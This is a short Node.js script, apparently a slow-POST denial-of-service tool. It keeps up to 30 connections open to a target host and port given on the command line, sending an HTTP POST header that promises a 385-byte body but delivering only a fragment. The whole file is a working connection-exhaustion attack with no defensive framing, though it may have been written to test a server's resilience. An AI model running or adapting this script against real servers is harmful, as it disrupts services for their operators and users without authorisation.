#!/usr/bin/env node

const net = require('net')

const maxConnections = 30
let connections = []

const host = process.argv[2] || '127.0.0.1'
const port = process.argv[3] || 80

function Connection(h, p) {
  this.state = 'active'
  this.t = Date.now()

  this.client = net.connect(
    { port: p, host: h },
    () => {
      console.log('Connected, sending...')

      this.client.write(
        'POST / HTTP/1.1\r\nHost: ' +
          host +
          '\r\n' +
          'Content-Type: application/x-www-form-urlenconded\r\n' +
          'Content-Length: 385\r\n\r\nvx=321&d1=fire&l'
      )

      console.log('Written')
    }
  )
  this.client.on('data', (data) => {
    console.log(`  Received ${data.length} bytes...`)
    this.client.end()
  })
  this.client.on('end', () => {
    var d = Date.now() - this.t
    this.state = 'ended'

    console.log(
      `Disconnected (duration: ${(d / 1000).toFixed(
        3
      )} seconds, remaining open: ${connections.length})`
    )
  })
  this.client.on('error', () => {
    this.state = 'error'
  })

  connections.push(this)
}

setInterval(() => {
  let notify = false

  // Add another connection if we haven't reached our max:
  if (connections.length < maxConnections) {
    new Connection(host, port)
    notify = true
  }

  // Remove dead connections
  connections = connections.filter((v) => v.state == 'active')

  if (notify) {
    console.log(`Active connections: ${connections.length} / ${maxConnections}`)
  }
}, 500)
